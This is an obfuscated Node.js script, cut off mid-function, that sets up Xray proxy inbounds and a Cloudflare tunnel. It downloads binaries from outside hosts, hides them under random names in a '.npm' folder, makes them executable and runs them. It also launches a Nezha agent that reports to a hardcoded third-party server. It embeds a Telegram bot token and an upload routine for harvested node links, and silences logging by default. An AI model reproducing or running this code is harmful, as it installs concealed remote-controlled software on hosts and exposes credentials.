#!/usr/bin/env node

const _0x235ba3 = _0x5cf0
;(function (_0x5bf4c2, _0x1c47d3) {
  const _0x1c6f59 = _0x5cf0,
    _0x2e994e = _0x5bf4c2()
  while (!![]) {
    try {
      const _0x983a25 =
        (-parseInt(_0x1c6f59(0x14e)) / 0x1) * (parseInt(_0x1c6f59(0x1e4)) / 0x2) +
        (-parseInt(_0x1c6f59(0x146)) / 0x3) * (parseInt(_0x1c6f59(0x1b5)) / 0x4) +
        parseInt(_0x1c6f59(0x156)) / 0x5 +
        (-parseInt(_0x1c6f59(0x148)) / 0x6) * (-parseInt(_0x1c6f59(0x230)) / 0x7) +
        parseInt(_0x1c6f59(0x13b)) / 0x8 +
        (parseInt(_0x1c6f59(0x236)) / 0x9) * (parseInt(_0x1c6f59(0x1c2)) / 0xa) +
        (parseInt(_0x1c6f59(0x20f)) / 0xb) * (-parseInt(_0x1c6f59(0x183)) / 0xc)
      if (_0x983a25 === _0x1c47d3) break
      else _0x2e994e['push'](_0x2e994e['shift']())
    } catch (_0x5cacaf) {
      _0x2e994e['push'](_0x2e994e['shift']())
    }
  }
})(_0x1cdb, 0x91e8b)
function _0x5cf0(_0x5aa9a6, _0x163a65) {
  const _0x1cdb19 = _0x1cdb()
  return (
    (_0x5cf0 = function (_0x5cf0e7, _0xa954c2) {
      _0x5cf0e7 = _0x5cf0e7 - 0x138
      let _0x50c066 = _0x1cdb19[_0x5cf0e7]
      return _0x50c066
    }),
    _0x5cf0(_0x5aa9a6, _0x163a65)
  )
}
const http = require(_0x235ba3(0x23c)),
  axios = require(_0x235ba3(0x1bd)),
  os = require('os'),
  fs = require('fs'),
  path = require(_0x235ba3(0x13e)),
  crypto = require('crypto'),
  { promisify } = require(_0x235ba3(0x226)),
  { exec: execCommand, execSync } = require(_0x235ba3(0x1b6)),
  exec = promisify(execCommand),
  PORT = process[_0x235ba3(0x1a5)][_0x235ba3(0x1d5)] || 0xbb8,
  SUB_PATH = process[_0x235ba3(0x1a5)]['SUB_PATH'] || _0x235ba3(0x1d9),
  NAME = process[_0x235ba3(0x1a5)][_0x235ba3(0x18b)] || 'js-node',
  CFIP = process['env']['CFIP'] || _0x235ba3(0x1ed),
  CFPORT = process[_0x235ba3(0x1a5)][_0x235ba3(0x188)] || 0x1bb,
  UPLOAD_URL = process['env'][_0x235ba3(0x1e0)] || '',
  FILE_PATH = process[_0x235ba3(0x1a5)]['FILE_PATH'] || '.npm',
  NEZHA_SERVER = process['env'][_0x235ba3(0x253)] || 'nezha.933993.xyz:443',
  NEZHA_PORT = process[_0x235ba3(0x1a5)][_0x235ba3(0x231)] || '',
  NEZHA_KEY = process[_0x235ba3(0x1a5)][_0x235ba3(0x159)] || _0x235ba3(0x1d3),
  UUID = process[_0x235ba3(0x1a5)][_0x235ba3(0x24f)] || _0x235ba3(0x24c),
  ARGO_AUTH = process[_0x235ba3(0x1a5)][_0x235ba3(0x1fe)] || _0x235ba3(0x1c1),
  ARGO_DOMAIN = process[_0x235ba3(0x1a5)][_0x235ba3(0x240)] || 'dcdeploy.933993.xyz',
  ARGO_PORT = process[_0x235ba3(0x1a5)][_0x235ba3(0x1c3)] || 0xe2e1,
  S5_PORT = process[_0x235ba3(0x1a5)][_0x235ba3(0x216)] || '',
  HY2_PORT = process[_0x235ba3(0x1a5)]['HY2_PORT'] || '',
  REALITY_PORT = process['env'][_0x235ba3(0x23d)] || '',
  CHAT_ID = process[_0x235ba3(0x1a5)][_0x235ba3(0x17e)] || '7575949494',
  BOT_TOKEN = process[_0x235ba3(0x1a5)][_0x235ba3(0x1be)] || '7591685848:AAF1sdGl3DXLdy3llHez0_sDEUC8xBw6D50',
  SHOW_LOG = ![_0x235ba3(0x153), _0x235ba3(0x138), 'no'][_0x235ba3(0x218)](
    (process[_0x235ba3(0x1a5)][_0x235ba3(0x1de)] || _0x235ba3(0x153))[_0x235ba3(0x24b)]()
  )
!SHOW_LOG && ((console[_0x235ba3(0x167)] = () => {}), (console['error'] = () => {}))
function alwaysLog(_0x2b8785) {
  const _0x2f8b42 = _0x235ba3
  process[_0x2f8b42(0x252)]['write'](_0x2b8785 + '\x0a')
}
if (!fs[_0x235ba3(0x1d2)](FILE_PATH)) fs['mkdirSync'](FILE_PATH)
else {
}
function isValidPort(_0x56f23b) {
  const _0x15b68e = _0x235ba3
  try {
    if (_0x56f23b === null || _0x56f23b === undefined || _0x56f23b === '') return ![]
    if (typeof _0x56f23b === _0x15b68e(0x157) && _0x56f23b[_0x15b68e(0x154)]() === '') return ![]
    const _0x3aefe4 = parseInt(_0x56f23b)
    if (isNaN(_0x3aefe4)) return ![]
    if (_0x3aefe4 < 0x1 || _0x3aefe4 > 0xffff) return ![]
    return !![]
  } catch (_0x1686b5) {
    return ![]
  }
}
function generateRandomName() {
  const _0x36c9a7 = _0x235ba3,
    _0x5598f0 = _0x36c9a7(0x19c)
  let _0x396ecc = ''
  for (let _0x50c30d = 0x0; _0x50c30d < 0x6; _0x50c30d++) {
    _0x396ecc += _0x5598f0['charAt'](Math['floor'](Math[_0x36c9a7(0x1f2)]() * _0x5598f0[_0x36c9a7(0x243)]))
  }
  return _0x396ecc
}
let subContent = null,
  privateKey = '',
  publicKey = ''
const npmName = generateRandomName(),
  webName = generateRandomName(),
  botName = generateRandomName(),
  phpName = generateRandomName()
let npmPath = path[_0x235ba3(0x19d)](FILE_PATH, npmName),
  phpPath = path[_0x235ba3(0x19d)](FILE_PATH, phpName),
  webPath = path[_0x235ba3(0x19d)](FILE_PATH, webName),
  botPath = path[_0x235ba3(0x19d)](FILE_PATH, botName),
  subPath = path['join'](FILE_PATH, _0x235ba3(0x15f)),
  listPath = path[_0x235ba3(0x19d)](FILE_PATH, 'list.txt'),
  bootLogPath = path[_0x235ba3(0x19d)](FILE_PATH, _0x235ba3(0x20c)),
  configPath = path[_0x235ba3(0x19d)](FILE_PATH, _0x235ba3(0x21c)),
  certPath = path[_0x235ba3(0x19a)](FILE_PATH, 'cert.pem'),
  keyPath = path[_0x235ba3(0x19a)](FILE_PATH, _0x235ba3(0x18c))
function deleteNodes() {
  const _0x43abd0 = _0x235ba3
  try {
    if (!UPLOAD_URL) return
    if (!fs['existsSync'](subPath)) return
    let _0x18cdf8
    try {
      _0x18cdf8 = fs[_0x43abd0(0x212)](subPath, _0x43abd0(0x1f7))
    } catch {
      return null
    }
    const _0x1234cc = Buffer['from'](_0x18cdf8, _0x43abd0(0x190))['toString'](_0x43abd0(0x1f7)),
      _0x420827 = _0x1234cc['split']('\x0a')['filter']((_0x254073) => /(vless|vmess|trojan|hysteria2|socks):\/\//[_0x43abd0(0x233)](_0x254073))
    if (_0x420827['length'] === 0x0) return
    return (
      axios['post'](UPLOAD_URL + _0x43abd0(0x222), JSON[_0x43abd0(0x16e)]({ nodes: _0x420827 }), { headers: { 'Content-Type': _0x43abd0(0x1b0) } })[
        _0x43abd0(0x1a0)
      ]((_0x24d15d) => {
        return null
      }),
      null
    )
  } catch (_0x3e9ca0) {
    return null
  }
}
function cleanupOldFiles() {
  const _0x576b31 = _0x235ba3
  try {
    const _0x1ee228 = fs['readdirSync'](FILE_PATH)
    _0x1ee228[_0x576b31(0x1e2)]((_0x4af568) => {
      const _0x4f58d9 = _0x576b31,
        _0x1be00c = path['join'](FILE_PATH, _0x4af568)
      try {
        const _0x1810cb = fs[_0x4f58d9(0x210)](_0x1be00c)
        _0x1810cb[_0x4f58d9(0x177)]() && fs[_0x4f58d9(0x13c)](_0x1be00c)
      } catch (_0x34d687) {}
    })
  } catch (_0x5efd1b) {}
}
function generateX25519Keypair() {
  const _0x2e6a47 = _0x235ba3,
    { publicKey: _0x3eee93, privateKey: _0x16bbfd } = crypto[_0x2e6a47(0x1a8)]('x25519'),
    _0x5079a0 = _0x16bbfd[_0x2e6a47(0x241)]({ type: _0x2e6a47(0x22a), format: _0x2e6a47(0x246) })[_0x2e6a47(0x251)](-0x20),
    _0x3fe5dc = _0x3eee93[_0x2e6a47(0x241)]({ type: _0x2e6a47(0x16c), format: _0x2e6a47(0x246) })[_0x2e6a47(0x251)](-0x20)
  return { privateKey: _0x5079a0[_0x2e6a47(0x1db)]('base64url'), publicKey: _0x3fe5dc[_0x2e6a47(0x1db)](_0x2e6a47(0x16a)) }
}
function generateOrLoadKeyPair() {
  const _0x143a3f = _0x235ba3,
    _0x168432 = path[_0x143a3f(0x19d)](FILE_PATH, _0x143a3f(0x21d))
  if (fs[_0x143a3f(0x1d2)](_0x168432)) {
    const _0x623bef = fs[_0x143a3f(0x212)](_0x168432, 'utf8'),
      _0x418c49 = _0x623bef[_0x143a3f(0x168)](/PrivateKey:\s*(.*)/),
      _0x5cc3e1 = _0x623bef['match'](/PublicKey:\s*(.*)/)
    if (_0x418c49 && _0x5cc3e1) {
      ;((privateKey = _0x418c49[0x1][_0x143a3f(0x154)]()),
        (publicKey = _0x5cc3e1[0x1][_0x143a3f(0x154)]()),
        console[_0x143a3f(0x167)](_0x143a3f(0x165), privateKey),
        console['log'](_0x143a3f(0x1a6), publicKey))
      return
    }
  }
  const _0x1e277c = generateX25519Keypair()
  ;((privateKey = _0x1e277c['privateKey']),
    (publicKey = _0x1e277c[_0x143a3f(0x1b7)]),
    fs['writeFileSync'](_0x168432, _0x143a3f(0x18e) + privateKey + _0x143a3f(0x245) + publicKey + '\x0a', _0x143a3f(0x20b)),
    console[_0x143a3f(0x167)](_0x143a3f(0x165), privateKey),
    console[_0x143a3f(0x167)](_0x143a3f(0x1a6), publicKey))
}
const FALLBACK_EC_KEY =
    '-----BEGIN\x20EC\x20PARAMETERS-----\x0a' +
    _0x235ba3(0x209) +
    _0x235ba3(0x24d) +
    _0x235ba3(0x204) +
    _0x235ba3(0x1d0) +
    'AwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa\x0a' +
    _0x235ba3(0x16b) +
    _0x235ba3(0x198),
  FALLBACK_CERT =
    _0x235ba3(0x22b) +
    _0x235ba3(0x164) +
    'EzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\x0a' +
    _0x235ba3(0x206) +
    _0x235ba3(0x1ec) +
    _0x235ba3(0x145) +
    'BfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\x0a' +
    _0x235ba3(0x142) +
    'eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\x0a' +
    _0x235ba3(0x1c0)
function ensureTlsCertificates(_0xac4494, _0x1e2801) {
  const _0x39e689 = _0x235ba3
  if (fs['existsSync'](_0xac4494) && fs[_0x39e689(0x1d2)](_0x1e2801)) return
  fs['mkdirSync'](path['dirname'](_0xac4494), { recursive: !![] })
  try {
    ;(execSync(_0x39e689(0x161), { stdio: _0x39e689(0x1fa) }),
      execSync(_0x39e689(0x17b) + _0x1e2801 + '\x22', { stdio: _0x39e689(0x1fa) }),
      execSync(_0x39e689(0x1f1) + _0x1e2801 + _0x39e689(0x187) + _0xac4494 + _0x39e689(0x147), { stdio: 'ignore' }))
    return
  } catch (_0x1294f7) {}
  ;(fs[_0x39e689(0x1ba)](_0x1e2801, FALLBACK_EC_KEY), fs[_0x39e689(0x1ba)](_0xac4494, FALLBACK_CERT))
}
function getCertificateFingerprint(_0x2131b5) {
  const _0x1a32aa = _0x235ba3
  try {
    const _0x13f462 = execSync(_0x1a32aa(0x1d6) + _0x2131b5 + '\x22', { encoding: _0x1a32aa(0x20b), timeout: 0xbb8 })[_0x1a32aa(0x154)](),
      _0x94d0c9 = _0x13f462[_0x1a32aa(0x168)](/=(.+)$/)
    if (_0x94d0c9 && _0x94d0c9[0x1]) return _0x94d0c9[0x1]['toUpperCase']()
  } catch (_0x5990cb) {}
  try {
    const _0x43f7ca = fs[_0x1a32aa(0x212)](_0x2131b5, _0x1a32aa(0x20b)),
      _0x33c544 = _0x43f7ca['match'](/-----BEGIN CERTIFICATE-----([\s\S]+?)-----END CERTIFICATE-----/)
    if (!_0x33c544) return ''
    const _0x48daad = _0x33c544[0x1][_0x1a32aa(0x1c7)](/\s/g, ''),
      _0x1522c5 = Buffer[_0x1a32aa(0x1ac)](_0x48daad, _0x1a32aa(0x190)),
      _0x3e7413 = crypto[_0x1a32aa(0x1e8)](_0x1a32aa(0x1ee))[_0x1a32aa(0x1e7)](_0x1522c5)[_0x1a32aa(0x22f)](_0x1a32aa(0x194))
    return _0x3e7413[_0x1a32aa(0x168)](/.{2}/g)[_0x1a32aa(0x19d)](':')[_0x1a32aa(0x242)]()
  } catch (_0x442428) {
    return (console['error']('Failed\x20to\x20calculate\x20certificate\x20fingerprint:', _0x442428), '')
  }
}
async function generateConfig() {
  const _0xccbc1d = _0x235ba3,
    _0x162643 = {
      log: { access: '/dev/null', error: _0xccbc1d(0x15e), loglevel: _0xccbc1d(0x1f9) },
      inbounds: [
        {
          tag: _0xccbc1d(0x15c),
          port: ARGO_PORT,
          listen: '::',
          protocol: _0xccbc1d(0x1fc),
          settings: {
            clients: [{ id: UUID, flow: _0xccbc1d(0x15d) }],
            decryption: 'none',
            fallbacks: [
              { dest: 0xbb9 },
              { path: _0xccbc1d(0x166), dest: 0xbba },
              { path: _0xccbc1d(0x16f), dest: 0xbbb },
              { path: '/trojan-argo', dest: 0xbbc }
            ]
          },
          streamSettings: { network: 'tcp' }
        },
        {
          tag: _0xccbc1d(0x24e),
          port: 0xbb9,
          listen: '127.0.0.1',
          protocol: 'vless',
          settings: { clients: [{ id: UUID }], decryption: _0xccbc1d(0x1f9) },
          streamSettings: { network: _0xccbc1d(0x186), security: _0xccbc1d(0x1f9) }
        },
        {
          tag: _0xccbc1d(0x1cd),
          port: 0xbba,
          listen: '127.0.0.1',
          protocol: _0xccbc1d(0x1fc),
          settings: { clients: [{ id: UUID, level: 0x0 }], decryption: _0xccbc1d(0x1f9) },
          streamSettings: { network: 'ws', security: _0xccbc1d(0x1f9), wsSettings: { path: _0xccbc1d(0x166) } },
          sniffing: { enabled: !![], destOverride: [_0xccbc1d(0x23c), _0xccbc1d(0x1e9), _0xccbc1d(0x23f)], metadataOnly: ![] }
        },
        {
          tag: 'vmess-ws-in',
          port: 0xbbb,
          listen: _0xccbc1d(0x144),
          protocol: _0xccbc1d(0x1c8),
          settings: { clients: [{ id: UUID, alterId: 0x0 }] },
          streamSettings: { network: 'ws', wsSettings: { path: _0xccbc1d(0x16f) } },
          sniffing: { enabled: !![], destOverride: ['http', _0xccbc1d(0x1e9), _0xccbc1d(0x23f)], metadataOnly: ![] }
        },
        {
          tag: _0xccbc1d(0x14b),
          port: 0xbbc,
          listen: _0xccbc1d(0x144),
          protocol: _0xccbc1d(0x1fd),
          settings: { clients: [{ password: UUID }] },
          streamSettings: { network: 'ws', security: 'none', wsSettings: { path: '/trojan-argo' } },
          sniffing: { enabled: !![], destOverride: ['http', _0xccbc1d(0x1e9), _0xccbc1d(0x23f)], metadataOnly: ![] }
        }
      ],
      dns: { servers: ['https+local://8.8.8.8/dns-query'] },
      outbounds: [
        { protocol: _0xccbc1d(0x1e6), tag: _0xccbc1d(0x152) },
        { protocol: _0xccbc1d(0x1b2), tag: _0xccbc1d(0x181) }
      ]
    }
  ;(isValidPort(REALITY_PORT) &&
    _0x162643['inbounds'][_0xccbc1d(0x180)]({
      tag: _0xccbc1d(0x1ff),
      listen: '::',
      port: parseInt(REALITY_PORT),
      protocol: 'vless',
      settings: { clients: [{ id: UUID, flow: 'xtls-rprx-vision' }], decryption: _0xccbc1d(0x1f9) },
      streamSettings: {
        network: 'raw',
        security: 'reality',
        realitySettings: { show: ![], dest: _0xccbc1d(0x220), xver: 0x0, serverNames: [_0xccbc1d(0x1e5)], privateKey: privateKey, shortIds: [''] }
      }
    }),
    isValidPort(HY2_PORT) &&
      _0x162643[_0xccbc1d(0x143)][_0xccbc1d(0x180)]({
        tag: _0xccbc1d(0x18a),
        listen: '::',
        port: parseInt(HY2_PORT),
        protocol: _0xccbc1d(0x1c4),
        settings: { version: 0x2, clients: [{ auth: UUID }] },
        streamSettings: {
          network: 'hysteria',
          hysteriaSettings: { version: 0x2, masquerade: { type: _0xccbc1d(0x163), url: 'https://bing.com' } },
          security: _0xccbc1d(0x1e9),
          tlsSettings: { alpn: ['h3'], certificates: [{ certificateFile: certPath, keyFile: keyPath }] }
        }
      }),
    isValidPort(S5_PORT) &&
      _0x162643[_0xccbc1d(0x143)][_0xccbc1d(0x180)]({
        tag: _0xccbc1d(0x184),
        listen: '::',
        port: parseInt(S5_PORT),
        protocol: 'socks',
        settings: { auth: 'password', accounts: [{ user: UUID[_0xccbc1d(0x170)](0x0, 0x8), pass: UUID[_0xccbc1d(0x229)](-0xc) }], udp: !![] }
      }),
    fs['writeFileSync'](path[_0xccbc1d(0x19d)](FILE_PATH, _0xccbc1d(0x21c)), JSON['stringify'](_0x162643, null, 0x2)))
}
function getSystemArchitecture() {
  const _0x12dfcf = _0x235ba3,
    _0x29eabb = os[_0x12dfcf(0x158)]()
  return _0x29eabb === _0x12dfcf(0x1a1) || _0x29eabb === _0x12dfcf(0x185) || _0x29eabb === _0x12dfcf(0x20a) ? _0x12dfcf(0x1a1) : 'amd'
}
function downloadFile(_0x4cf57f, _0x103dbd, _0x2ede1f) {
  const _0x3ab00e = _0x235ba3,
    _0x59c346 = _0x4cf57f,
    _0x4515f0 = _0x59c346 + _0x3ab00e(0x1a3)
  !fs['existsSync'](FILE_PATH) && fs[_0x3ab00e(0x1d4)](FILE_PATH, { recursive: !![] })
  const _0x594c60 = fs[_0x3ab00e(0x1e1)](_0x4515f0)
  axios({ method: _0x3ab00e(0x1a7), url: _0x103dbd, responseType: _0x3ab00e(0x249) })
    [_0x3ab00e(0x239)]((_0x231eb3) => {
      const _0x2cbc51 = _0x3ab00e
      ;(_0x231eb3[_0x2cbc51(0x19b)][_0x2cbc51(0x150)](_0x594c60),
        _0x594c60['on']('finish', () => {
          const _0x3753c5 = _0x2cbc51
          _0x594c60[_0x3753c5(0x175)]((_0x504164) => {
            const _0x5bf1ed = _0x3753c5
            if (_0x504164) {
              const _0x416e23 = _0x5bf1ed(0x17a) + path[_0x5bf1ed(0x139)](_0x59c346) + _0x5bf1ed(0x1eb) + _0x504164[_0x5bf1ed(0x24a)]
              ;(fs[_0x5bf1ed(0x1ad)](_0x4515f0, () => {}), console[_0x5bf1ed(0x1f0)](_0x416e23), _0x2ede1f(_0x416e23))
              return
            }
            try {
              fs[_0x5bf1ed(0x1aa)](_0x4515f0, _0x59c346)
            } catch (_0x4e308a) {
              const _0x1253ac = _0x5bf1ed(0x17a) + path[_0x5bf1ed(0x139)](_0x59c346) + _0x5bf1ed(0x1eb) + _0x4e308a[_0x5bf1ed(0x24a)]
              ;(fs[_0x5bf1ed(0x1ad)](_0x4515f0, () => {}), console[_0x5bf1ed(0x1f0)](_0x1253ac), _0x2ede1f(_0x1253ac))
              return
            }
            ;(console[_0x5bf1ed(0x167)](_0x5bf1ed(0x17a) + path[_0x5bf1ed(0x139)](_0x59c346) + _0x5bf1ed(0x171)), _0x2ede1f(null, _0x59c346))
          })
        }),
        _0x594c60['on']('error', (_0x4dc864) => {
          const _0x21660f = _0x2cbc51
          fs['unlink'](_0x4515f0, () => {})
          const _0xb13ed1 = _0x21660f(0x17a) + path['basename'](_0x59c346) + _0x21660f(0x1eb) + _0x4dc864['message']
          ;(console[_0x21660f(0x1f0)](_0xb13ed1), _0x2ede1f(_0xb13ed1))
        }))
    })
    ['catch']((_0x23c910) => {
      const _0x47607b = _0x3ab00e
      fs[_0x47607b(0x1ad)](_0x4515f0, () => {})
      const _0x190c3c = 'Download\x20' + path[_0x47607b(0x139)](_0x59c346) + _0x47607b(0x1eb) + _0x23c910[_0x47607b(0x24a)]
      ;(console[_0x47607b(0x1f0)](_0x190c3c), _0x2ede1f(_0x190c3c))
    })
}
async function downloadFilesAndRun() {
  const _0x18e8d3 = _0x235ba3,
    _0x5a8473 = getSystemArchitecture(),
    _0x1033ee = getFilesForArchitecture(_0x5a8473)
  if (_0x1033ee[_0x18e8d3(0x243)] === 0x0) {
    console['log'](_0x18e8d3(0x193))
    return
  }
  const _0x44eb3e = _0x1033ee['map']((_0xd4120c) => {
    return new Promise((_0x5406ae, _0x427756) => {
      const _0x1f5fcb = (_0x505960) => {
        const _0x2c8497 = _0x5cf0
        downloadFile(_0xd4120c['fileName'], _0xd4120c[_0x2c8497(0x1b9)][_0x505960], (_0x18051e, _0x363faf) => {
          const _0x153347 = _0x2c8497
          if (!_0x18051e) {
            _0x5406ae(_0x363faf)
            return
          }
          if (_0x505960 + 0x1 < _0xd4120c[_0x153347(0x1b9)][_0x153347(0x243)]) {
            ;(console[_0x153347(0x167)](_0x153347(0x1fb) + path['basename'](_0xd4120c[_0x153347(0x232)]) + '\x20from\x20backup\x20source'),
              _0x1f5fcb(_0x505960 + 0x1))
            return
          }
          _0x427756(_0x18051e)
        })
      }
      _0x1f5fcb(0x0)
    })
  })
  try {
    await Promise[_0x18e8d3(0x1f6)](_0x44eb3e)
  } catch (_0x59a1f6) {
    console['error'](_0x18e8d3(0x217), _0x59a1f6)
    return
  }
  function _0x4dc152(_0x1e6a2d) {
    const _0xb75abf = _0x18e8d3,
      _0x1cf5db = 0x1fd
    _0x1e6a2d[_0xb75abf(0x1e2)]((_0x556700) => {
      const _0xa8e80a = _0xb75abf
      if (fs[_0xa8e80a(0x1d2)](_0x556700))
        try {
          ;(fs[_0xa8e80a(0x1a4)](_0x556700, _0x1cf5db),
            console[_0xa8e80a(0x167)](_0xa8e80a(0x202) + _0x556700 + ':\x20' + _0x1cf5db[_0xa8e80a(0x1db)](0x8)))
        } catch (_0x4f4cbc) {
          console['error']('Empowerment\x20failed\x20for\x20' + _0x556700 + ':\x20' + _0x4f4cbc)
        }
    })
  }
  const _0x32bd4a = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath]
  _0x4dc152(_0x32bd4a)
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      const _0x113785 = NEZHA_SERVER['includes'](':') ? NEZHA_SERVER['split'](':')[_0x18e8d3(0x1b1)]() : '',
        _0x25fc3f = new Set([_0x18e8d3(0x162), _0x18e8d3(0x18d), _0x18e8d3(0x149), _0x18e8d3(0x22d), '2083', _0x18e8d3(0x1dd)]),
        _0x172ce2 = _0x25fc3f[_0x18e8d3(0x250)](_0x113785) ? _0x18e8d3(0x23e) : _0x18e8d3(0x153),
        _0x11f447 =
          _0x18e8d3(0x1bc) +
          NEZHA_KEY +
          _0x18e8d3(0x1e3) +
          NEZHA_SERVER +
          '\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20' +
          _0x172ce2 +
          _0x18e8d3(0x1f4) +
          UUID
      fs[_0x18e8d3(0x1ba)](path[_0x18e8d3(0x19d)](FILE_PATH, _0x18e8d3(0x14c)), _0x11f447)
      const _0x2ac897 = _0x18e8d3(0x17c) + phpPath + '\x20-c\x20\x22' + FILE_PATH + _0x18e8d3(0x21b)
      try {
        ;(await exec(_0x2ac897), console['log'](phpName + _0x18e8d3(0x205)), await new Promise((_0x12dd4b) => setTimeout(_0x12dd4b, 0x3e8)))
      } catch (_0x326038) {
        console[_0x18e8d3(0x1f0)](_0x18e8d3(0x178) + _0x326038)
      }
    } else {
      let _0x90c524 = ''
      const _0x197d72 = [_0x18e8d3(0x162), '8443', _0x18e8d3(0x149), _0x18e8d3(0x22d), _0x18e8d3(0x1da), '2053']
      _0x197d72['includes'](NEZHA_PORT) && (_0x90c524 = '--tls')
      const _0x483668 =
        _0x18e8d3(0x17c) +
        npmPath +
        '\x20-s\x20' +
        NEZHA_SERVER +
        ':' +
        NEZHA_PORT +
        _0x18e8d3(0x140) +
        NEZHA_KEY +
        '\x20' +
        _0x90c524 +
        _0x18e8d3(0x227)
      try {
        ;(await exec(_0x483668),
          console[_0x18e8d3(0x167)](npmName + _0x18e8d3(0x205)),
          await new Promise((_0x313c3f) => setTimeout(_0x313c3f, 0x3e8)))
      } catch (_0x1f3b32) {
        console[_0x18e8d3(0x1f0)](_0x18e8d3(0x1d8) + _0x1f3b32)
      }
    }
  } else console['log']('NEZHA\x20variable\x20is\x20empty,skip\x20running')
  const _0x3a3e66 = _0x18e8d3(0x17c) + webPath + _0x18e8d3(0x215) + FILE_PATH + _0x18e8d3(0x208)
  try {
    ;(await exec(_0x3a3e66), console[_0x18e8d3(0x167)](webName + _0x18e8d3(0x205)), await new Promise((_0x5730b7) => setTimeout(_0x5730b7, 0x3e8)))
  } catch (_0x5922c3) {
    console[_0x18e8d3(0x1f0)](_0x18e8d3(0x16d) + _0x5922c3)
  }
  if (fs[_0x18e8d3(0x1d2)](botPath)) {
    let _0x217197
    if (ARGO_AUTH[_0x18e8d3(0x168)](/^[A-Z0-9a-z=]{120,250}$/))
      _0x217197 = 'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20' + ARGO_AUTH
    else
      ARGO_AUTH['match'](/TunnelSecret/)
        ? (_0x217197 = _0x18e8d3(0x201) + path[_0x18e8d3(0x19a)](FILE_PATH, _0x18e8d3(0x13f)) + _0x18e8d3(0x196))
        : (_0x217197 =
            _0x18e8d3(0x235) + path[_0x18e8d3(0x19a)](bootLogPath) + '\x22\x20--loglevel\x20info\x20--url\x20http://localhost:' + ARGO_PORT)
    try {
      ;(await exec(_0x18e8d3(0x197) + path[_0x18e8d3(0x19a)](botPath) + '\x22\x20' + _0x217197 + '\x20>/dev/null\x202>&1\x20&'),
        console[_0x18e8d3(0x167)](botName + _0x18e8d3(0x205)),
        await new Promise((_0x30a6aa) => setTimeout(_0x30a6aa, 0x7d0)))
    } catch (_0x28b0af) {
      console[_0x18e8d3(0x1f0)]('Error\x20executing\x20command:\x20' + _0x28b0af)
    }
  }
  await new Promise((_0x28c411) => setTimeout(_0x28c411, 0x1388))
}
function getFilesForArchitecture(_0x4c687e) {
  const _0xb93bd = _0x235ba3,
    _0x160394 = _0x4c687e === _0xb93bd(0x1a1) ? _0xb93bd(0x199) : 'https://amd64.oooen.com',
    _0xf98e9e = _0x4c687e === _0xb93bd(0x1a1) ? _0xb93bd(0x1b4) : _0xb93bd(0x254),
    _0x40639a = [
      { fileName: webPath, fileUrls: [_0x160394 + _0xb93bd(0x247), _0xf98e9e + _0xb93bd(0x247)] },
      { fileName: botPath, fileUrls: [_0x160394 + _0xb93bd(0x160), _0xf98e9e + _0xb93bd(0x160)] }
    ]
  return (
    NEZHA_SERVER &&
      NEZHA_KEY &&
      (NEZHA_PORT
        ? _0x40639a['unshift']({ fileName: npmPath, fileUrls: [_0x160394 + _0xb93bd(0x172), _0xf98e9e + _0xb93bd(0x172)] })
        : _0x40639a['unshift']({ fileName: phpPath, fileUrls: [_0x160394 + _0xb93bd(0x1ea), _0xf98e9e + _0xb93bd(0x1ea)] })),
    _0x40639a
  )
}
function argoType() {
  const _0x586e94 = _0x235ba3
  if (!ARGO_AUTH || !ARGO_DOMAIN) {
    console[_0x586e94(0x167)](_0x586e94(0x1ca))
    return
  }
  if (ARGO_AUTH[_0x586e94(0x218)]('TunnelSecret')) {
    fs[_0x586e94(0x1ba)](path[_0x586e94(0x19d)](FILE_PATH, _0x586e94(0x176)), ARGO_AUTH)
    const _0x564e3c =
      _0x586e94(0x155) +
      ARGO_AUTH[_0x586e94(0x1ab)]('\x22')[0xb] +
      _0x586e94(0x213) +
      path[_0x586e94(0x19d)](FILE_PATH, _0x586e94(0x176)) +
      '\x0a\x20\x20protocol:\x20http2\x0a\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20' +
      ARGO_DOMAIN +
      _0x586e94(0x211) +
      ARGO_PORT +
      _0x586e94(0x141)
    fs[_0x586e94(0x1ba)](path[_0x586e94(0x19d)](FILE_PATH, 'tunnel.yml'), _0x564e3c)
  } else console[_0x586e94(0x167)](_0x586e94(0x1ef) + ARGO_PORT + '\x20in\x20clouudflare')
}
async function waitForQuickTunnelLog(_0x24d834 = 0x7530) {
  const _0x2c82c9 = _0x235ba3,
    _0x6caa9b = Date[_0x2c82c9(0x1dc)]() + _0x24d834
  while (Date[_0x2c82c9(0x1dc)]() < _0x6caa9b) {
    try {
      if (fs[_0x2c82c9(0x1d2)](bootLogPath)) {
        const _0x4117ab = fs[_0x2c82c9(0x212)](bootLogPath, _0x2c82c9(0x1f7))
        if (/trycloudflare\.com/[_0x2c82c9(0x233)](_0x4117ab)) return _0x4117ab
      }
    } catch (_0x39ddd1) {}
    await new Promise((_0x5ba9f8) => setTimeout(_0x5ba9f8, 0x3e8))
  }
  return ''
}
async function extractDomains() {
  const _0xb47d85 = _0x235ba3
  let _0x17b766
  if (ARGO_AUTH && ARGO_DOMAIN) ((_0x17b766 = ARGO_DOMAIN), console[_0xb47d85(0x167)](_0xb47d85(0x169), _0x17b766), await generateLinks(_0x17b766))
  else
    try {
      const _0x3d622a = await waitForQuickTunnelLog(),
        _0x341a50 = _0x3d622a[_0xb47d85(0x1ab)]('\x0a'),
        _0x197b5f = []
      _0x341a50[_0xb47d85(0x1e2)]((_0xf440ee) => {
        const _0x562223 = _0xb47d85,
          _0x3b535b = _0xf440ee[_0x562223(0x168)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/)
        if (_0x3b535b) {
          const _0x2076ab = _0x3b535b[0x1]
          _0x197b5f[_0x562223(0x180)](_0x2076ab)
        }
      })
      if (_0x197b5f[_0xb47d85(0x243)] > 0x0)
